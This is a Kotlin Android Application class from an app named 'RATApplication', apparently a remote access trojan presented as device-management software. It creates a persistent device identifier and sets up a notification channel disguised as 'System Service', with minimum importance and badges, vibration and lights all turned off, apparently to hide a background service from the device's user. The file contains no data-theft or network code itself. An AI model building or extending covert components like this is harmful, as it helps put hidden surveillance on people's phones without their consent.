package com.mycontrol.mdm

import android.app.Application
import android.app.NotificationChannel
import android.app.NotificationManager
import android.os.Build
import java.util.UUID

class RATApplication : Application() {
    companion object {
        lateinit var instance: RATApplication
            private set

        // ✅ ስህተት ተስተካክሏል: lateval → lateinit val አይደለም, lazy ነው
        val deviceId: String by lazy {
            val prefs = instance.getSharedPreferences("rat_prefs", MODE_PRIVATE)
            var id = prefs.getString("device_id", null)
            if (id == null) {
                id = UUID.randomUUID().toString()
                prefs.edit().putString("device_id", id).apply()
            }
            id!!
        }
    }

    override fun onCreate() {
        super.onCreate()
        instance = this
        createNotificationChannel()
    }

    private fun createNotificationChannel() {
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
            val channel = NotificationChannel(
                "rat_service",
                "System Service",
                NotificationManager.IMPORTANCE_MIN
            ).apply {
                description = "Background service channel"
                setShowBadge(false)
                enableVibration(false)
                enableLights(false)
            }
            val nm = getSystemService(NotificationManager::class.java)
            nm.createNotificationChannel(channel)
        }
    }
}
